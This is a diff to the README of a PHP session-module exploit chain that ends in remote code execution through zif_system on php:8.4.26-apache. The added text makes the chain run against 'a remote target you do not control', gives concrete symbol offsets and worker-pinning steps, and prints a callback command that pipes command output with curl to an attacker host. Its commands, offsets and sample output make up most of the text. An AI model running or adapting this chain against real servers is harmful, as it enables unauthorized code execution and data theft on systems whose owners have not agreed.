@@ -6,7 +6,8 @@ official `php.ini-production` active, `memory_limit` 128M, **official MPM: `Star
 
 - single-worker lab baseline: 3/3 fresh containers -> `uid=33(www-data) gid=33(www-data)`;
 - stock 150-worker configuration (`chain.sh --workers 150`, i.e. 149 half-sent connections held):
-  **3/3**;
+  **3/3** in the original run; a replay on the same host gave 2/10, so treat the pool as a race
+  ([reliability](VERSION_MATRIX.md#reliability-by-pool-size));
 - one extra run with an arbitrary command line, so this is `system()`, not a fixed payload:
 
 ```
@@ -42,7 +43,7 @@ Every value below is measured on this image, not taken from another build.
 | `php_url_encode` | `libphp + 0x484820` | gdb, names the disclosure site |
 | main chunk | disclosed chunk `+ 0x400000` | leak cluster compared with `alloc_globals->heap`: `0x7fff96600000` from both |
 | `S` | main `+ 0xF8398` | the slot the `ht` value has to occupy |
-| `hsv` | main `+ 0x7D720` | the stale zval slot the spray has to cover |
+| `hsv` | main `+ 0x7D720` | the `zend_reference` the spray has to cover (the stale zval itself is the global `ps_globals + 0x168`) |
 
 `S` and `hsv` are the reference lab's layout constants. They held here unchanged, which is expected:
 same image, same ini, same arming shapes. They are the first thing to re-measure on a different image
@@ -99,16 +100,17 @@ bash poc/chain.sh --workers 150 \
 `libphp`, `main`, `S` and `hsv`, and the chain still lands.
 
 Before A1 it runs `poc/preflight.py` (reachability, PHP version, front end, and — with `--probe
-/probe.php` — SAPI, ini and pool size) and stops on an incompatible target. After A1 it runs
+/probe.php` — SAPI, ini, arch and pool size) and stops on an incompatible target. After A1 it runs
 `poc/arming_gate.py`, which requires the `tried to allocate 4096` refusal before B1 is spent: a
 different size means the build charges its limits differently and the disclosure cannot work. On a
-target without a readable container log the gate exits `4` (unverified); `--allow-unverified`
-continues anyway. `--skip-preflight` skips the first gate.
+target without a readable container log the gate exits `4` (unverified); `--allow-unverified` (or
+`--remote`, which `chain.sh` sets by itself when the container is unreachable) continues anyway and
+reports the arming as inferred. `--skip-preflight` skips the first gate.
 
 The gate prefers the container log over the response body and uses one or the other, never both: a body
 that happens to contain `4096` while the log names a 2 MiB refusal would otherwise be read as "armed",
 with the authoritative source cited as evidence for the opposite. When docker is not on `PATH`, or the
-log carries no allocation size, the gate says so rather than silently falling back.
+log carries no allocation size, the gate says which source it had and never assumes the log.
 
 **A target that arms but cannot disclose.** On 8.5.11 the arming step reproduces exactly, and B1 then
 returns nothing, because `PS(id)` is handed to the encoder as a refcounted copy of someone else's string
@@ -122,8 +124,9 @@ attempted. Use it to validate the detector against a known-positive build, not a
 
 | file | role |
 |---|---|
-| `poc/preflight.py` | recon and hard gate: PHP version, front end/SAPI, ini, pool size; refuses an incompatible target |
-| `poc/arming_gate.py` | reads the A1 evidence and refuses B1 unless the failure is the 4096-byte encode-site refusal |
+| `poc/preflight.py` | recon and hard gate: PHP version, front end/SAPI, ini, arch, pool size; refuses an incompatible target |
+| `poc/arming_gate.py` | reads the A1 evidence and refuses B1 unless the failure is the 4096-byte encode-site refusal; infers it from the HTTP shape when there is no log |
+| `poc/probe_facts.py` | reads `php_uname('m')`, the PHP version and the distribution off a deployed probe, which select the offset profile |
 | `poc/a1_arm.py` | A1 arming (also the tool that pinned the 4096 OOM site and page 0x137) |
 | `poc/b1_forge.py` | B1 builder: `--spec`, `--tag`, `--save-cookie`, narrow and wide windows |
 | `poc/decode_leak_cookie.py` | decoder: engine-faithful `+`/`%XX` handling, symbol subtraction, cluster voting |
@@ -143,56 +146,63 @@ is enough for `&ps_globals`, `&alloc_globals`, `&zval_ptr_dtor` and `&zif_system
 
 ## Against a remote target you do not control
 
-Every stage of the chain is pure HTTP, so the exploit half runs against a remote host. The wrapper does
-not: `chain.sh` verifies two things by reaching into the container, and that access is what a remote
-target lacks. Measured on 2026-10-29 by pointing `chain.sh` at a live target with `--container` set to a
-name that does not exist.
+Every stage of the chain is pure HTTP, so the whole thing runs against a host you cannot reach into.
+Reaching into a container only ever bought three things — the symbol table, the arming log and the proof
+file — and each now has a remote source. A container, when one is reachable, is still preferred: `nm`
+beats a profile and a log beats an inference.
 
-What still works, end to end, with the stages driven by hand:
+`chain.sh` decides this on its own. If `docker inspect` on `--container` fails, the run switches to
+remote mode and says so; nothing else changes on the command line.
 
 ```
-A1    attempt 1 sid=00 body=1060211 -> 500  211 B
-B1    Set-Cookie: 1679448 chars
-addrs MAIN=0x7fff27e00000 S=0x7fff27ef8398 ZIF=0x7fff263fcd70
-A2    body=279369 -> 500
-B2    response=0        <- the connection dropped, i.e. the fire landed
-      /tmp/c.txt: uid=33(www-data) gid=33(www-data)
+$ bash poc/chain.sh --target https://host/index.php --probe /probe.php \
+      --cmd 'id>/var/www/html/pwn.txt' --proof pwn.txt --proof-url https://host/pwn.txt
+no container access to 'host': log, symbols and proof are taken from the target
+symbols: profile x86_64/8.4.26
+armed (inferred): A1 answered 500 with a 211-byte body and no Set-Cookie - the armed shape with display_errors Off (--remote)
+...
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+note: exit 7 - the proof is real, arming was only inferred
 ```
 
-Four things have to be supplied or accepted:
+| what | remote source | how good it is |
+| --- | --- | --- |
+| **symbols** | `--symbol` if given, else the profile for arch/version/distro from `probe.php`, else the architecture read out of the leak | a profile is a measurement of one binary; a build without one needs its own `nm` pass |
+| **the gate** | the A1 HTTP outcome: `5xx` + a small body and no cookie is the armed shape with `display_errors Off`, `200` is a build that does not arm | inferred, not read. Exit `7` while the proof stands; `--container` returns it to a verified `0` |
+| **the proof** | `--proof-url`, or a relative `--proof` fetched next to the entry point | needs a path the target serves and `www-data` can write |
 
-| what | why it breaks remotely |
-| --- | --- |
-| **symbols** | `chain.sh` reads them with `docker exec … nm`; without that it falls back to the **arm64** 8.4.26 offsets. On an x86-64 host those are wrong and B2 misses. Pass `--symbols` — official-image values below |
-| **the gate** | A1 answers `500` with a 211-byte body and `display_errors=Off` hides the text, so the only evidence of the 4096 refusal is the container log. The gate prints `not armed: A1 completed without an OOM` and exits `2` |
-| **`--allow-unverified`** | does not help: that path only opens when A1 *drops the connection* (`sockerr`). A1 completes with a 500, so the flag changes nothing |
-| **the proof** | read with `docker exec` / `docker cp`; neither exists remotely |
+Profiles are keyed by architecture, version and distribution, so a package build never silently gets
+the official-image offsets: `x86_64/8.4.26` is `php:8.4.26-apache`, `x86_64/8.4.24+debian13` is
+Debian 13's `libapache2-mod-php8.4`. The Debian entry arms and discloses but B2 does not land yet
+([VERSION_MATRIX.md](VERSION_MATRIX.md#debian-13-php-8424)). For a build with no profile, pass the
+three offsets from that host's own `nm`:
 
-Official-image offsets, measured on both architectures (valid only if the target runs the same image):
-
-| arch | `zval_ptr_dtor` | `zif_system` | `zend_hash_destroy` |
-| --- | --- | --- | --- |
-| x86-64 | `0x65EB60` | `0x465370` | `0x6138F0` |
-| arm64 | `0x638120` | `0x42CD70` | `0x5EEFC8` |
+```
+--symbol zval_ptr_dtor=0x65EB60 --symbol zif_system=0x465370 --symbol zend_hash_destroy=0x6138F0
+```
 
 A distro package is a different binary and needs its own `nm` pass over `libphp.so` (section 8.2 of
-[VD_REENTRY_FULL.md](VD_REENTRY_FULL.md)).
+[VD_REENTRY_FULL.md](VD_REENTRY_FULL.md)). `preflight.py --probe` says so when the arch/version pair has
+no profile.
 
-**Getting the proof out.** Writing it into the docroot is the obvious channel and it works on a normal
-host, but not in this lab: `lab/start_target.sh` mounts `-v …/www:/var/www/html:ro`, so a redirect there
-fails with `Read-only file system` and the file never appears. Measured, and it cost a false negative
-before the mount was noticed. Alternatives that need no target-shell: a callback
-(`--cmd 'id | curl -s -d @- http://<your-host>:<port>/'` — the image ships `curl` but no `wget`, `nc` or
-`busybox`), or writing to any path the VServer serves and is not mounted read-only.
+**Architecture is never guessed from the build number.** probe.php reports it; without a probe the leak
+does (arm64 mmap keeps bits 32..47 at `0x7fff`, x86-64 randomises below that), and `--arch arm64|x86_64`
+overrides both. A wrong profile is not a crash: `leak_addrs.py` resolves a plausible libphp base tens of
+MB off, and B2 then misses.
 
-**Expected success rate on a freshly built host.** A default `docker run php:8.4.26-apache` keeps
-`MaxRequestWorkers 150`. The pinned multi-worker configuration measured 3/3 on arm64 and **1/3** on
-x86-64, so a first attempt on a default host is a coin toss that says nothing about the target. For a
-deterministic run, set `MaxRequestWorkers 1`.
+**Getting the proof out.** Writing into the docroot is the channel that needs no extra infrastructure —
+but the lab mounts `-v …/www:/var/www/html:ro`, so a redirect there fails with `Read-only file system`
+and the file never appears. Measured, and it cost a false negative before the mount was noticed. The
+directory also has to be writable by the worker (`chmod 777` in the rehearsal below) — the redirect
+fails silently if it is not, and the only symptom is the 404. A callback works when the target cannot be
+written at all: `--cmd 'id | curl -s -d @- http://<your-host>:<port>/'` (the image ships `curl` but no
+`wget`, `nc` or `busybox`).
 
-Not implemented: a `--skip-gate` flag and a `--proof-url` reader. Both would make the remote run a single
-command at the cost of stating, in the output, that arming is unverified — until then the stages have to
-be driven by hand for a remote target.
+**What a first blind attempt will tell you.** It will not tell you whether the target is exploitable:
+a default `docker run php:8.4.26-apache` keeps `MaxRequestWorkers 150`, and the pinned multi-worker
+configuration measured 3/3 on arm64 originally and **1/3** on x86-64; a replay on the same arm64 host
+gave 2/10. A miss there is the pinning race, not the target — `chain.sh` says so when B2 comes back
+answered. Set `MaxRequestWorkers 1` for a deterministic run.
 
 ## Limits
 
@@ -208,8 +218,8 @@ is a compatibility estimate.
 - **Worker count.** Both configurations are covered: the single-worker lab (nothing to hold) and the
   stock MPM, where `--workers 150` first occupies `MaxRequestWorkers - 1` children with half-sent
   requests (`poc/hold_workers.py`) so every step lands on the same child. A target with a different
-  `MaxRequestWorkers` needs that number passed in. On x86-64 the pinned stock-MPM run was 1/3 — the
-  free child rotates even with the sockets held.
+  `MaxRequestWorkers` needs that number passed in. On x86-64 the pinned stock-MPM run was 1/3 and an
+  arm64 replay 2/10 - the free child rotates even with the sockets held.
 - **Configuration dependence.** The chain needs `session.upload_progress.cleanup=On` (default),
   `display_errors=Off`, an active `php.ini`, `memory_limit` 128M, and the exact `--big 78` arming
   shape. `--fillers 115` is layout-tuned: a different image moves `hsv`/`S` and needs a re-measure.
